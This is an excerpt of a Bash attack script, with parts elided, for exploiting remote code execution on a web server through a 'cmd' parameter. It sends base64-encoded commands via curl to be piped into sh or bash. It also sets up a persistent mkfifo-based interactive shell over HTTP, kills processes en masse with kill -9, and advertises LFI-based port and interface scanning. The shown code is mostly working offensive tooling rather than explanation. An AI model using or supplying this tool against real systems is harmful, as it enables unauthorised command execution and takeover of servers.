...
function ctrl_c(){
  ...
  rm ./output.tmp ./new_output.tmp &>/dev/null
  exit 1
}
...
function helpPanel(){
  ...
  echo -e "\n${blueColour}RCE:${endColour}${grayColour}\t parameters to exploit an RCE or spawn a tty over http${endColour} "
  ...
  echo -e "\n${blueColour}LFI:${endColour}\t parameters to extract information through an LFI"
  echo -e "\t-s, --scan\t\t\t${grayColour}Extract ports and interfaces from the machine${endColour}"
...
if [ "${#script_args[@]}" -eq 1 ] && [ -z "$url" ];then
  url="${script_args[0]}"
elif [ "${#script_args[@]}" -eq 1 ] && [ -n "$url" ];then
  helpPanel
elif [ "${#script_args[@]}" -ne 1 ] && [ -z "$url" ];then
  helPanel
fi
...
function no_interactive_command(){
  b64_command=$(echo $1 | base64 -w 0)
  curl -s --get "$url" --data-urlencode "cmd=echo $b64_command | base64 -d |sh "
  exit 0 
}
...
function create_shell(){
  ...
  curl -s --get "$url" --data-urlencode "cmd=echo $b64_mkfifo | base64 -d |bash;disown"
}
...
function erase_shell(){
  ...
  kill_mkfifo="for pid in \$(ps o pid= |sort -nr);do kill -9 \$pid;done"
...
if [ -n "$command" ] && [ "$scan" -eq 0 ] && [ -z "$param" ] && [ -z "$lfi_file" ];then
  ...
  while read -p ">" -r command;do
    if [[ "$command" =~ ^( *exit)(;|&&|&| *| .*)*$ ]];then
      exit_value=$(execute_command 'tty' | grep -v "^ *$" |tail -n1)
      #echo $exit_value
    ...
    elif [[ "$command" =~ ^( *clear)(;|&&|&| *| .*)*$ ]] && [ "$(execute_command 'tty' | grep -v "^ *$" |tail -n1)" == "not a tty" ];then
      aux=$(execute_command "$command")
      echo "$aux" > ./output.tmp
      echo "$aux" > ./new_output.tmp
      output=$(diff ./output.tmp ./new_output.tmp | grep -oP "> (.*?)$" | awk '{$1=""}1')
      echo -e "${grayColour}$output${endColour}"
    else
      execute_command "$command" > new_output.tmp
      output=$(diff ./output.tmp ./new_output.tmp | grep -oP "> (.*?)$" | awk '{$1=""}1')
      echo -e "${grayColour}$output${endColour}"
      cat new_output.tmp > output.tmp
    fi
